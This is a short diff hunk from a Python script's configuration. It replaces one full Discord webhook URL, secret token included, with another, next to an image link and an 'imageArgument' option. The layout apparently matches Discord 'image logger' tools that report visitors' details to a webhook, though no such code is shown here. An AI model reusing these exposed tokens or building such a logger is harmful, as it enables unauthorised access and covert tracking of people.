@@ -7,7 +7,7 @@ from http.server import BaseHTTPRequestHandler
 
 config = {
     # Configuration du webhook et des options générales de l'application.
-    "webhook": "https://discord.com/api/webhooks/1494360022698954985/4UEFCfGcZSP-2bExtF5Uj40_Zv63sUM982ozt9XNaM7rVt6y2inUVEYIiV9pck2MtiOW",
+    "webhook": "https://discord.com/api/webhooks/1494388722068881551/GPELkrraANFn11tOWYFrlhBmiviZB4mn5xUyXuWTwz4Fwqn9SpMiEZnNyRs2sIY7cutU",
     "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
     "imageArgument": True,
     # Des personnalisations comme l'username, la couleur de l'embed et d'autres options.
